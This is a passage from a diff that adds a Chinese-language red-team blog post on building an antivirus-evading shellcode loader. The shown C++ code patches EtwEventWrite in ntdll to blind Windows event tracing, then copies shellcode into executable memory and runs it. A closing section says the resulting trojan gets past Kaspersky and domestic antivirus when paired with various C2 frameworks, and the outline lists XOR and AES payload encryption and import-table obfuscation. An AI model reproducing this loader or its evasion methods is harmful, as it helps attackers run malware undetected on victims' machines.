(HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);</span><br><span class="line">tNtVirtual oNtVirtual;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disableETW</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// return 0</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> patch[] = &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;;     <span class="comment">// xor rax, rax; ret</span></span><br><span class="line"></span><br><span class="line">    ULONG oldprotect = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(patch);</span><br><span class="line"></span><br><span class="line">    HANDLE hCurrentProc = GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sEtwEventWrite[] = &#123; <span class="string">'E'</span>,<span class="string">'t'</span>,<span class="string">'w'</span>,<span class="string">'E'</span>,<span class="string">'v'</span>,<span class="string">'e'</span>,<span class="string">'n'</span>,<span class="string">'t'</span>,<span class="string">'W'</span>,<span class="string">'r'</span>,<span class="string">'i'</span>,<span class="string">'t'</span>,<span class="string">'e'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line">    <span class="keyword">void</span>* pEventWrite = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), (LPCSTR)sEtwEventWrite);</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NTDLL.DLL START ADDRESS: %08x"</span>, (DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="built_in">printf</span>(<span class="string">"\nNtProtectVirtualMemory ADDRESS: %08x"</span>, (DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>)); &#125;</span><br><span class="line"></span><br><span class="line">    FARPROC farProc = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oNtVirtual = (tNtVirtual)farProc;</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, PAGE_READWRITE, &amp;oldprotect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//memcpy(pEventWrite, patch, size / sizeof(patch[0]));</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pEventWrite, patch, <span class="number">4</span>);</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    FlushInstructionCache(hCurrentProc, pEventWrite, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  disableETW();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">	((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>最后马子实测配合其他C2可以过卡巴，但是如果用cs的话国产杀软能过，卡巴过不去，卡巴查杀原因是数据库查杀，CS特征被检测到，得从cs特征上修改。</p>
+<p><img src="1.png" alt=""></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/11448?page=1#toc-11" target="_blank" rel="noopener">红队队开发基础-基础免杀(一)</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/C/" rel="tag"># C++</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/" rel="prev" title="SMB_RDP_WMI_hash传递探测_利用">
+      <i class="fa fa-chevron-left"></i> SMB_RDP_WMI_hash传递探测_利用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/" rel="next" title="vCenter常用攻击手法">
+      vCenter常用攻击手法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#外部库"><span class="nav-number">1.1.</span> <span class="nav-text">外部库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加密部分"><span class="nav-number">2.</span> <span class="nav-text">加密部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#异或部分"><span class="nav-number">2.1.</span> <span class="nav-text">异或部分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#时间戳"><span class="nav-number">2.2.</span> <span class="nav-text">时间戳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AES加密"><span class="nav-number">2.3.</span> <span class="nav-text">AES加密</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加载"><span class="nav-number">3.</span> <span class="nav-text">加载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#导入表混淆"><span class="nav-number">3.1.</span> <span class="nav-text">导入表混淆</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改参数为函数名"><span class="nav-number">4.</span> <span class="nav-text">修改参数为函数名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#禁用Windows事件跟踪-ETW"><span class="nav-number">5.</span> <span class="nav-text">禁用Windows事件跟踪 (ETW)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杀软测试"><span class="nav-number">6.</span> <span class="nav-text">杀软测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
